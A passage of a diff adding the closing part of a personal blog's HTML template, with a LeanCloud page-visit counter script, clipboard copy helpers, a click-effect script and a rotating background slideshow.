+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/lib/zclip/clipboard.min.js"></script>	
+
+<!-- �Զ����js�ļ� -->
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+ 
+ <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  
+ 
+</body>
+</html>
+<!-- 页面点击价值观 -->
+<script type="text/javascript" src="/js/src/jiazhiguan.js"></script>
+
+ <!--动态背景轮播-->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+<script>
+  $.backstretch([  
+          "/images/background/1.jpg",
+          "/images/background/2.jpg",
+          "/images/background/3.jpg"
+    ], { duration: 30000, fade: 1500 }); 
+</script>
+
+
+
